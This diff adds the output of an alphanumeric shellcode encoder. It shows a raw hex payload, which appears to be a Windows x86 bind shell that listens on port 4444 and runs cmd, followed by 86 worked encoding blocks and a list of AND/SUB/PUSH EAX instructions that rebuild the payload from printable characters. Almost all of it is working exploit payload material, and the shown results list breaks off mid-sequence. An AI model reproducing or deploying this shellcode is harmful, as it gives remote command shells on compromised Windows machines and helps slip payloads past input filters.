@@ -1,0 +1,1402 @@
+
+       _       _                                                              _           
+      | |     | |                                                            | |          
+  __ _| |_ __ | |__   __ _   _ __  _   _ _ __ ___     ___ _ __   ___ ___   __| | ___ _ __ 
+ / _` | | '_ \| '_ \ / _` | | '_ \| | | | '_ ` _ \   / _ \ '_ \ / __/ _ \ / _` |/ _ \ '__|
+| (_| | | |_) | | | | (_| | | | | | |_| | | | | | | |  __/ | | | (_| (_) | (_| |  __/ |   
+ \__,_|_| .__/|_| |_|\__,_| |_| |_|\__,_|_| |_| |_|  \___|_| |_|\___\___/ \__,_|\___|_|   
+        | |                                                                               
+        |_|                                                                               
+
+
+
+('[*] bytes to encode:', '83EC10545831D2BB04000000F7F329D4fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5')
+
+[+] Using alphanum encoder
+[+] Received 344 bytes to encode
+[+] Nos of bad chars: 135
+[+] Processing block 86/86
+Opcode to produce : 00 53 ff d5
+reversed : d5 ff 53 00
+-----------
+2's complement : 2a 00 ad 00
+                    -----------
+                    63 55 38 55
+                    63 55 38 55
+                    63 56 3c 56
+
+[+] Processing block 85/86
+Opcode to produce : 13 72 6f 6a
+reversed : 6a 6f 72 13
+-----------
+2's complement : 95 90 8d ed
+                    -----------
+                    31 30 2e 4f
+                    31 30 2e 4f
+                    33 30 31 4f
+
+[+] Processing block 84/86
+Opcode to produce : 75 05 bb 47
+reversed : 47 bb 05 75
+-----------
+2's complement : b8 44 fa 8b
+                    -----------
+                    3d 6c 53 2d
+                    3d 6c 53 2d
+                    3d 6c 54 31
+
+[+] Processing block 83/86
+Opcode to produce : 0a 80 fb e0
+reversed : e0 fb 80 0a
+-----------
+2's complement : 1f 04 7f f6
+                    -----------
+                    5f 56 2a 52
+                    5f 56 2a 52
+                    60 58 2b 52
+
+[+] Processing block 82/86
+Opcode to produce : d5 3c 06 7c
+reversed : 7c 06 3c d5
+-----------
+2's complement : 83 f9 c3 2b
+                    -----------
+                    2b 53 3e 63
+                    2b 53 3e 63
+                    2d 53 46 65
+
+[+] Processing block 81/86
+Opcode to produce : 95 bd 9d ff
+reversed : ff 9d bd 95
+-----------
+2's complement : 00 62 42 6b
+                    -----------
+                    55 20 6b 23
+                    55 20 6b 23
+                    56 21 6c 25
+
+[+] Processing block 80/86
+Opcode to produce : e2 5d 68 a6
+reversed : a6 68 5d e2
+-----------
+2's complement : 59 97 a2 1e
+                    -----------
+                    73 32 35 5f
+                    73 32 35 5f
+                    73 33 37 60
+
+[+] Processing block 79/86
+Opcode to produce : d5 bb aa c5
+reversed : c5 aa bb d5
+-----------
+2's complement : 3a 55 44 2b
+                    -----------
+                    68 71 6b 63
+                    68 71 6b 63
+                    69 72 6d 65
+
+[+] Processing block 78/86
+Opcode to produce : 87 1d 60 ff
+reversed : ff 60 1d 87
+-----------
+2's complement : 00 9f e2 79
+                    -----------
+                    55 35 4b 28
+                    55 35 4b 28
+                    56 35 4c 29
+
+[+] Processing block 77/86
+Opcode to produce : ff 30 68 08
+reversed : 08 68 30 ff
+-----------
+2's complement : f7 97 cf 01
+                    -----------
+                    52 32 44 55
+                    52 32 44 55
+                    53 33 46 57
+
+[+] Processing block 76/86
+Opcode to produce : e0 4e 56 46
+reversed : 46 56 4e e0
+-----------
+2's complement : b9 a9 b1 20
+                    -----------
+                    3c 38 39 60
+                    3c 38 39 60
+                    41 39 3e 60
+
+[+] Processing block 75/86
+Opcode to produce : 86 ff d5 89
+reversed : 89 d5 ff 86
+-----------
+2's complement : 76 2a 00 7a
+                    -----------
+                    27 63 55 28
+                    27 63 55 28
+                    27 63 56 2a
+
+[+] Processing block 74/86
+Opcode to produce : 68 79 cc 3f
+reversed : 3f cc 79 68
+-----------
+2's complement : c0 33 86 98
+                    -----------
+                    3e 66 2c 32
+                    3e 66 2c 32
+                    43 67 2e 34
+
+[+] Processing block 73/86
+Opcode to produce : 56 56 53 56
+reversed : 56 53 56 56
+-----------
+2's complement : a9 ac a9 aa
+                    -----------
+                    38 38 38 37
+                    38 38 38 37
+                    39 3c 39 3c
+
+[+] Processing block 72/86
+Opcode to produce : 56 46 56 4e
+reversed : 4e 56 46 56
+-----------
+2's complement : b1 a9 b9 aa
+                    -----------
+                    3b 38 3c 37
+                    3b 38 3c 37
+                    3b 39 41 3c
+
+[+] Processing block 71/86
+Opcode to produce : 54 50 56 56
+reversed : 56 56 50 54
+-----------
+2's complement : a9 a9 af ac
+                    -----------
+                    38 38 39 38
+                    38 38 39 38
+                    39 39 3d 3c
+
+[+] Processing block 70/86
+Opcode to produce : 10 c6 00 44
+reversed : 44 00 c6 10
+-----------
+2's complement : bb ff 39 f0
+                    -----------
+                    3d 54 68 50
+                    3d 54 68 50
+                    41 56 69 50
+
+[+] Processing block 69/86
+Opcode to produce : 01 8d 44 24
+reversed : 24 44 8d 01
+-----------
+2's complement : db bb 72 ff
+                    -----------
+                    49 3d 26 55
+                    49 3d 26 55
+                    49 41 26 55
+
+[+] Processing block 68/86
+Opcode to produce : 44 24 3c 01
+reversed : 01 3c 24 44
+-----------
+2's complement : fe c3 db bc
+                    -----------
+                    54 41 49 3d
+                    54 41 49 3d
+                    56 41 49 42
+
+[+] Processing block 67/86
+Opcode to produce : e2 fd 66 c7
+reversed : c7 66 fd e2
+-----------
+2's complement : 38 99 02 1e
+                    -----------
+                    68 32 55 5f
+                    68 32 55 5f
+                    68 34 57 60
+
+[+] Processing block 66/86
+Opcode to produce : 6a 12 59 56
+reversed : 56 59 12 6a
+-----------
+2's complement : a9 a6 ed 96
+                    -----------
+                    38 37 4f 32
+                    38 37 4f 32
+                    39 38 4f 32
+
+[+] Processing block 65/86
+Opcode to produce : 57 57 31 f6
+reversed : f6 31 57 57
+-----------
+2's complement : 09 ce a8 a9
+                    -----------
+                    58 44 38 38
+                    58 44 38 38
+                    59 46 38 39
+
+[+] Processing block 64/86
+Opcode to produce : 00 89 e3 57
+reversed : 57 e3 89 00
+-----------
+2's complement : a8 1c 77 00
+                    -----------
+                    37 5e 27 55
+                    37 5e 27 55
+                    39 60 28 56
+
+[+] Processing block 63/86
+Opcode to produce : 68 63 6d 64
+reversed : 64 6d 63 68
+-----------
+2's complement : 9b 92 9c 98
+                    -----------
+                    33 30 34 32
+                    33 30 34 32
+                    35 32 34 34
+
+[+] Processing block 62/86
+Opcode to produce : 4d 61 ff d5
+reversed : d5 ff 61 4d
+-----------
+2's complement : 2a 00 9e b3
+                    -----------
+                    63 55 34 3b
+                    63 55 34 3b
+                    63 56 36 3d
+
+[+] Processing block 61/86
+Opcode to produce : 97 68 75 6e
+reversed : 6e 75 68 97
+-----------
+2's complement : 91 8a 97 69
+                    -----------
+                    30 2e 32 23
+                    30 2e 32 23
+                    31 2e 33 23
+
+[+] Processing block 60/86
+Opcode to produce : e1 ff d5 57
+reversed : 57 d5 ff e1
+-----------
+2's complement : a8 2a 00 1f
+                    -----------
+                    37 63 55 5f
+                    37 63 55 5f
+                    39 63 55 61
+
+[+] Processing block 59/86
+Opcode to produce : 68 74 ec 3b
+reversed : 3b ec 74 68
+-----------
+2's complement : c4 13 8b 98
+                    -----------
+                    41 5b 2d 32
+                    41 5b 2d 32
+                    41 5d 31 34
+
+[+] Processing block 58/86
+Opcode to produce : ff ff d5 57
+reversed : 57 d5 ff ff
+-----------
+2's complement : a8 2a 00 01
+                    -----------
+                    37 63 55 55
+                    37 63 55 55
+                    39 63 55 57
+
+[+] Processing block 57/86
+Opcode to produce : 68 b7 e9 38
+reversed : 38 e9 b7 68
+-----------
+2's complement : c7 16 48 98
+                    -----------
+                    42 5c 6d 32
+                    42 5c 6d 32
+                    42 5d 6e 34
+
+[+] Processing block 56/86
+Opcode to produce : 67 ff d5 57
+reversed : 57 d5 ff 67
+-----------
+2's complement : a8 2a 00 99
+                    -----------
+                    37 63 55 33
+                    37 63 55 33
+                    39 63 56 33
+
+[+] Processing block 55/86
+Opcode to produce : 68 c2 db 37
+reversed : 37 db c2 68
+-----------
+2's complement : c8 24 3d 98
+                    -----------
+                    42 61 69 32
+                    42 61 69 32
+                    43 61 6b 34
+
+[+] Processing block 54/86
+Opcode to produce : 6a 10 56 57
+reversed : 57 56 10 6a
+-----------
+2's complement : a8 a9 ef 96
+                    -----------
+                    38 38 4f 32
+                    38 38 4f 32
+                    38 39 51 32
+
+[+] Processing block 53/86
+Opcode to produce : 11 5c 89 e6
+reversed : e6 89 5c 11
+-----------
+2's complement : 19 76 a3 ef
+                    -----------
+                    5d 27 36 4f
+                    5d 27 36 4f
+                    5f 28 37 51
+
+[+] Processing block 52/86
+Opcode to produce : 97 68 02 00
+reversed : 00 02 68 97
+-----------
+2's complement : ff fd 97 69
+                    -----------
+                    55 54 32 23
+                    55 54 32 23
+                    55 55 33 23
+
+[+] Processing block 51/86
+Opcode to produce : df e0 ff d5
+reversed : d5 ff e0 df
+-----------
+2's complement : 2a 00 1f 21
+                    -----------
+                    63 55 5f 60
+                    63 55 5f 60
+                    63 55 60 61
+
+[+] Processing block 50/86
+Opcode to produce : 50 68 ea 0f
+reversed : 0f ea 68 50
+-----------
+2's complement : f0 15 97 b0
+                    -----------
+                    4f 5c 32 39
+                    4f 5c 32 39
+                    51 5d 33 3e
+
+[+] Processing block 49/86
+Opcode to produce : fd 40 50 40
+reversed : 40 50 40 fd
+-----------
+2's complement : bf af bf 03
+                    -----------
+                    3e 39 3e 56
+                    3e 39 3e 56
+                    43 3d 42 57
+
+[+] Processing block 48/86
+Opcode to produce : 08 59 50 e2
+reversed : e2 50 59 08
+-----------
+2's complement : 1d af a6 f8
+                    -----------
+                    5f 39 37 52
+                    5f 39 37 52
+                    5f 3d 38 54
+
+[+] Processing block 47/86
+Opcode to produce : 00 ff d5 6a
+reversed : 6a d5 ff 00
+-----------
+2's complement : 95 2a 01 00
+                    -----------
+                    31 63 55 55
+                    31 63 55 55
+                    32 63 56 56
+
+[+] Processing block 46/86
+Opcode to produce : 68 29 80 6b
+reversed : 6b 80 29 68
+-----------
+2's complement : 94 7f d6 98
+                    -----------
+                    31 2a 47 32
+                    31 2a 47 32
+                    32 2b 48 34
+
+[+] Processing block 45/86
+Opcode to produce : 29 c4 54 50
+reversed : 50 54 c4 29
+-----------
+2's complement : af ab 3b d7
+                    -----------
+                    39 37 69 47
+                    39 37 69 47
+                    3d 3c 69 49
+
+[+] Processing block 44/86
+Opcode to produce : 90 01 00 00
+reversed : 00 00 01 90
+-----------
+2's complement : ff ff fe 70
+                    -----------
+                    55 55 54 25
+                    55 55 54 25
+                    55 55 56 26
+
+[+] Processing block 43/86
+Opcode to produce : 07 ff d5 b8
+reversed : b8 d5 ff 07
+-----------
+2's complement : 47 2a 00 f9
+                    -----------
+                    6c 63 55 53
+                    6c 63 55 53
+                    6e 63 56 53
+
+[+] Processing block 42/86
+Opcode to produce : 68 4c 77 26
+reversed : 26 77 4c 68
+-----------
+2's complement : d9 88 b3 98
+                    -----------
+                    48 2d 3b 32
+                    48 2d 3b 32
+                    49 2e 3d 34
+
+[+] Processing block 41/86
+Opcode to produce : 73 32 5f 54
+reversed : 54 5f 32 73
+-----------
+2's complement : ab a0 cd 8d
+                    -----------
+                    39 35 44 2e
+                    39 35 44 2e
+                    39 36 45 31
+
+[+] Processing block 40/86
+Opcode to produce : 00 00 68 77
+reversed : 77 68 00 00
+-----------
+2's complement : 88 98 00 00
+                    -----------
+                    2d 32 55 55
+                    2d 32 55 55
+                    2e 33 55 56
+
+[+] Processing block 39/86
+Opcode to produce : 5d 68 33 32
+reversed : 32 33 68 5d
+-----------
+2's complement : cd cc 97 a3
+                    -----------
+                    44 44 32 36
+                    44 44 32 36
+                    45 44 33 37
+
+[+] Processing block 38/86
+Opcode to produce : 8b 12 eb 8d
+reversed : 8d eb 12 8b
+-----------
+2's complement : 72 14 ed 75
+                    -----------
+                    25 5c 4f 27
+                    25 5c 4f 27
+                    27 5c 4f 27
+
+[+] Processing block 37/86
+Opcode to produce : e0 5f 5f 5a
+reversed : 5a 5f 5f e0
+-----------
+2's complement : a5 a0 a0 20
+                    -----------
+                    37 35 35 60
+                    37 35 35 60
+                    37 36 35 60
+
+[+] Processing block 36/86
+Opcode to produce : 59 5a 51 ff
+reversed : ff 51 5a 59
+-----------
+2's complement : 00 ae a5 a7
+                    -----------
+                    55 39 37 37
+                    55 39 37 37
+                    56 3c 37 39
+
+[+] Processing block 35/86
+Opcode to produce : 24 5b 5b 61
+reversed : 61 5b 5b 24
+-----------
+2's complement : 9e a4 a4 dc
+                    -----------
+                    34 36 36 49
+                    34 36 36 49
+                    36 38 38 4a
+
+[+] Processing block 34/86
+Opcode to produce : d0 89 44 24
+reversed : 24 44 89 d0
+-----------
+2's complement : db bb 76 30
+                    -----------
+                    49 3d 27 65
+                    49 3d 27 65
+                    49 41 27 66
+
+[+] Processing block 33/86
+Opcode to produce : 8b 04 8b 01
+reversed : 01 8b 04 8b
+-----------
+2's complement : fe 74 fb 75
+                    -----------
+                    54 26 53 27
+                    54 26 53 27
+                    56 28 55 27
+
+[+] Processing block 32/86
+Opcode to produce : 58 1c 01 d3
+reversed : d3 01 1c 58
+-----------
+2's complement : 2c fe e3 a8
+                    -----------
+                    64 54 4b 38
+                    64 54 4b 38
+                    64 56 4d 38
+
+[+] Processing block 31/86
+Opcode to produce : 8b 0c 4b 8b
+reversed : 8b 4b 0c 8b
+-----------
+2's complement : 74 b4 f3 75
+                    -----------
+                    26 3c 51 27
+                    26 3c 51 27
+                    28 3c 51 27
+
+[+] Processing block 30/86
+Opcode to produce : 24 01 d3 66
+reversed : 66 d3 01 24
+-----------
+2's complement : 99 2c fe dc
+                    -----------
+                    32 64 54 49
+                    32 64 54 49
+                    34 64 56 4a
+
+[+] Processing block 29/86
+Opcode to produce : e4 58 8b 58
+reversed : 58 8b 58 e4
+-----------
+2's complement : a7 74 a7 1c
+                    -----------
+                    37 26 37 5e
+                    37 26 37 5e
+                    39 28 38 60
+
+[+] Processing block 28/86
+Opcode to produce : 3b 7d 24 75
+reversed : 75 24 7d 3b
+-----------
+2's complement : 8a db 82 c5
+                    -----------
+                    2e 49 2b 41
+                    2e 49 2b 41
+                    2e 49 2c 43
+
+[+] Processing block 27/86
+Opcode to produce : f6 03 7d f8
+reversed : f8 7d 03 f6
+-----------
+2's complement : 07 82 fc 0a
+                    -----------
+                    57 2b 53 58
+                    57 2b 53 58
+                    59 2c 55 5a
+
+[+] Processing block 26/86
+Opcode to produce : c7 38 e0 75
+reversed : 75 e0 38 c7
+-----------
+2's complement : 8a 1f c7 39
+                    -----------
+                    2c 5f 42 68
+                    2c 5f 42 68
+                    31 61 42 69
+
+[+] Processing block 25/86
+Opcode to produce : c1 cf 0d 01
+reversed : 01 0d cf c1
+-----------
+2's complement : fe f2 30 3f
+                    -----------
+                    54 50 65 6a
+                    54 50 65 6a
+                    56 51 65 6b
+
+[+] Processing block 24/86
+Opcode to produce : d6 31 ff ac
+reversed : ac ff 31 d6
+-----------
+2's complement : 53 00 ce 2a
+                    -----------
+                    70 55 44 63
+                    70 55 44 63
+                    72 56 45 64
+
+[+] Processing block 23/86
+Opcode to produce : 8b 34 8b 01
+reversed : 01 8b 34 8b
+-----------
+2's complement : fe 74 cb 75
+                    -----------
+                    54 26 43 27
+                    54 26 43 27
+                    56 28 45 27
+
+[+] Processing block 22/86
+Opcode to produce : 18 e3 3a 49
+reversed : 49 3a e3 18
+-----------
+2's complement : b6 c5 1c e8
+                    -----------
+                    3c 41 5e 4d
+                    3c 41 5e 4d
+                    3e 42 60 4e
+
+[+] Processing block 21/86
+Opcode to produce : 01 d3 8b 49
+reversed : 49 8b d3 01
+-----------
+2's complement : b6 74 2c ff
+                    -----------
+                    3c 26 64 55
+                    3c 26 64 55
+                    3e 27 64 55
+
+[+] Processing block 20/86
+Opcode to produce : 51 8b 59 20
+reversed : 20 59 8b 51
+-----------
+2's complement : df a6 74 af
+                    -----------
+                    4a 37 26 39
+                    4a 37 26 39
+                    4b 38 28 3d
+
+[+] Processing block 19/86
+Opcode to produce : e3 48 01 d1
+reversed : d1 01 48 e3
+-----------
+2's complement : 2e fe b7 1d
+                    -----------
+                    64 54 3c 5f
+                    64 54 3c 5f
+                    66 56 3e 5f
+
+[+] Processing block 18/86
+Opcode to produce : 8b 4c 11 78
+reversed : 78 11 4c 8b
+-----------
+2's complement : 87 ee b3 75
+                    -----------
+                    2d 4f 3b 27
+                    2d 4f 3b 27
+                    2d 50 3d 27
+
+[+] Processing block 17/86
+Opcode to produce : 10 8b 4a 3c
+reversed : 3c 4a 8b 10
+-----------
+2's complement : c3 b5 74 f0
+                    -----------
+                    41 3c 26 50
+                    41 3c 26 50
+                    41 3d 28 50
+
+[+] Processing block 16/86
+Opcode to produce : 52 57 8b 52
+reversed : 52 8b 57 52
+-----------
+2's complement : ad 74 a8 ae
+                    -----------
+                    39 26 38 39
+                    39 26 38 39
+                    3b 28 38 3c
+
+[+] Processing block 15/86
+Opcode to produce : 01 c7 e2 f2
+reversed : f2 e2 c7 01
+-----------
+2's complement : 0d 1d 38 ff
+                    -----------
+                    59 5e 68 55
+                    59 5e 68 55
+                    5a 60 68 55
+
+[+] Processing block 14/86
+Opcode to produce : 20 c1 cf 0d
+reversed : 0d cf c1 20
+-----------
+2's complement : f2 30 3e e0
+                    -----------
+                    50 65 6a 4a
+                    50 65 6a 4a
+                    51 65 6a 4c
+
+[+] Processing block 13/86
+Opcode to produce : 61 7c 02 2c
+reversed : 2c 02 7c 61
+-----------
+2's complement : d3 fd 83 9f
+                    -----------
+                    46 54 2b 35
+                    46 54 2b 35
+                    47 55 2d 35
+
+[+] Processing block 12/86
+Opcode to produce : 31 ff ac 3c
+reversed : 3c ac ff 31
+-----------
+2's complement : c3 53 00 cf
+                    -----------
+                    3e 70 55 45
+                    3e 70 55 45
+                    46 72 56 45
+
+[+] Processing block 11/86
+Opcode to produce : 0f b7 4a 26
+reversed : 26 4a b7 0f
+-----------
+2's complement : d9 b5 48 f1
+                    -----------
+                    48 3c 6d 50
+                    48 3c 6d 50
+                    49 3c 6e 51
+
+[+] Processing block 10/86
+Opcode to produce : 14 8b 72 28
+reversed : 28 72 8b 14
+-----------
+2's complement : d7 8d 74 ec
+                    -----------
+                    47 2e 26 4e
+                    47 2e 26 4e
+                    49 31 28 50
+
+[+] Processing block 9/86
+Opcode to produce : 52 0c 8b 52
+reversed : 52 8b 0c 52
+-----------
+2's complement : ad 74 f3 ae
+                    -----------
+                    39 26 51 39
+                    39 26 51 39
+                    3b 28 51 3c
+
+[+] Processing block 8/86
+Opcode to produce : 8b 50 30 8b
+reversed : 8b 30 50 8b
+-----------
+2's complement : 74 cf af 75
+                    -----------
+                    26 45 39 27
+                    26 45 39 27
+                    28 45 3d 27
+
+[+] Processing block 7/86
+Opcode to produce : e5 31 c0 64
+reversed : 64 c0 31 e5
+-----------
+2's complement : 9b 3f ce 1b
+                    -----------
+                    33 6a 44 5e
+                    33 6a 44 5e
+                    34 6b 45 5f
+
+[+] Processing block 6/86
+Opcode to produce : 00 00 60 89
+reversed : 89 60 00 00
+-----------
+2's complement : 76 a0 00 00
+                    -----------
+                    27 35 55 55
+                    27 35 55 55
+                    28 35 55 56
+
+[+] Processing block 5/86
+Opcode to produce : fc e8 82 00
+reversed : 00 82 e8 fc
+-----------
+2's complement : ff 7d 17 04
+                    -----------
+                    55 29 5c 56
+                    55 29 5c 56
+                    55 2a 5e 58
+
+[+] Processing block 4/86
+Opcode to produce : f7 f3 29 d4
+reversed : d4 29 f3 f7
+-----------
+2's complement : 2b d6 0c 09
+                    -----------
+                    63 47 59 58
+                    63 47 59 58
+                    65 47 59 59
+
+[+] Processing block 3/86
+Opcode to produce : 04 00 00 00
+reversed : 00 00 00 04
+-----------
+2's complement : ff ff ff fc
+                    -----------
+                    55 55 55 54
+                    55 55 55 54
+                    55 55 55 54
+
+[+] Processing block 2/86
+Opcode to produce : 58 31 d2 bb
+reversed : bb d2 31 58
+-----------
+2's complement : 44 2d ce a8
+                    -----------
+                    6b 64 44 38
+                    6b 64 44 38
+                    6d 65 46 38
+
+[+] Processing block 1/86
+Opcode to produce : 83 ec 10 54
+reversed : 54 10 ec 83
+-----------
+2's complement : ab ef 13 7d
+                    -----------
+                    39 4f 5b 29
+                    39 4f 5b 29
+                    39 50 5d 2b
+
+
+Results:
+--------
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x38\x55\x63 : SUB EAX,0x63553855
+ \x2d\x55\x38\x55\x63 : SUB EAX,0x63553855
+ \x2d\x56\x3c\x56\x63 : SUB EAX,0x63563c56
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x4f\x2e\x30\x31 : SUB EAX,0x31302e4f
+ \x2d\x4f\x2e\x30\x31 : SUB EAX,0x31302e4f
+ \x2d\x4f\x31\x30\x33 : SUB EAX,0x3330314f
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x2d\x53\x6c\x3d : SUB EAX,0x3d6c532d
+ \x2d\x2d\x53\x6c\x3d : SUB EAX,0x3d6c532d
+ \x2d\x31\x54\x6c\x3d : SUB EAX,0x3d6c5431
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x52\x2a\x56\x5f : SUB EAX,0x5f562a52
+ \x2d\x52\x2a\x56\x5f : SUB EAX,0x5f562a52
+ \x2d\x52\x2b\x58\x60 : SUB EAX,0x60582b52
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x63\x3e\x53\x2b : SUB EAX,0x2b533e63
+ \x2d\x63\x3e\x53\x2b : SUB EAX,0x2b533e63
+ \x2d\x65\x46\x53\x2d : SUB EAX,0x2d534665
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x23\x6b\x20\x55 : SUB EAX,0x55206b23
+ \x2d\x23\x6b\x20\x55 : SUB EAX,0x55206b23
+ \x2d\x25\x6c\x21\x56 : SUB EAX,0x56216c25
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5f\x35\x32\x73 : SUB EAX,0x7332355f
+ \x2d\x5f\x35\x32\x73 : SUB EAX,0x7332355f
+ \x2d\x60\x37\x33\x73 : SUB EAX,0x73333760
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x63\x6b\x71\x68 : SUB EAX,0x68716b63
+ \x2d\x63\x6b\x71\x68 : SUB EAX,0x68716b63
+ \x2d\x65\x6d\x72\x69 : SUB EAX,0x69726d65
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x28\x4b\x35\x55 : SUB EAX,0x55354b28
+ \x2d\x28\x4b\x35\x55 : SUB EAX,0x55354b28
+ \x2d\x29\x4c\x35\x56 : SUB EAX,0x56354c29
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x44\x32\x52 : SUB EAX,0x52324455
+ \x2d\x55\x44\x32\x52 : SUB EAX,0x52324455
+ \x2d\x57\x46\x33\x53 : SUB EAX,0x53334657
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x60\x39\x38\x3c : SUB EAX,0x3c383960
+ \x2d\x60\x39\x38\x3c : SUB EAX,0x3c383960
+ \x2d\x60\x3e\x39\x41 : SUB EAX,0x41393e60
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x28\x55\x63\x27 : SUB EAX,0x27635528
+ \x2d\x28\x55\x63\x27 : SUB EAX,0x27635528
+ \x2d\x2a\x56\x63\x27 : SUB EAX,0x2763562a
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x2c\x66\x3e : SUB EAX,0x3e662c32
+ \x2d\x32\x2c\x66\x3e : SUB EAX,0x3e662c32
+ \x2d\x34\x2e\x67\x43 : SUB EAX,0x43672e34
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x37\x38\x38\x38 : SUB EAX,0x38383837
+ \x2d\x37\x38\x38\x38 : SUB EAX,0x38383837
+ \x2d\x3c\x39\x3c\x39 : SUB EAX,0x393c393c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x37\x3c\x38\x3b : SUB EAX,0x3b383c37
+ \x2d\x37\x3c\x38\x3b : SUB EAX,0x3b383c37
+ \x2d\x3c\x41\x39\x3b : SUB EAX,0x3b39413c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x38\x39\x38\x38 : SUB EAX,0x38383938
+ \x2d\x38\x39\x38\x38 : SUB EAX,0x38383938
+ \x2d\x3c\x3d\x39\x39 : SUB EAX,0x39393d3c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x50\x68\x54\x3d : SUB EAX,0x3d546850
+ \x2d\x50\x68\x54\x3d : SUB EAX,0x3d546850
+ \x2d\x50\x69\x56\x41 : SUB EAX,0x41566950
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x26\x3d\x49 : SUB EAX,0x493d2655
+ \x2d\x55\x26\x3d\x49 : SUB EAX,0x493d2655
+ \x2d\x55\x26\x41\x49 : SUB EAX,0x49412655
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x3d\x49\x41\x54 : SUB EAX,0x5441493d
+ \x2d\x3d\x49\x41\x54 : SUB EAX,0x5441493d
+ \x2d\x42\x49\x41\x56 : SUB EAX,0x56414942
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5f\x55\x32\x68 : SUB EAX,0x6832555f
+ \x2d\x5f\x55\x32\x68 : SUB EAX,0x6832555f
+ \x2d\x60\x57\x34\x68 : SUB EAX,0x68345760
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x4f\x37\x38 : SUB EAX,0x38374f32
+ \x2d\x32\x4f\x37\x38 : SUB EAX,0x38374f32
+ \x2d\x32\x4f\x38\x39 : SUB EAX,0x39384f32
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x38\x38\x44\x58 : SUB EAX,0x58443838
+ \x2d\x38\x38\x44\x58 : SUB EAX,0x58443838
+ \x2d\x39\x38\x46\x59 : SUB EAX,0x59463839
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x27\x5e\x37 : SUB EAX,0x375e2755
+ \x2d\x55\x27\x5e\x37 : SUB EAX,0x375e2755
+ \x2d\x56\x28\x60\x39 : SUB EAX,0x39602856
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
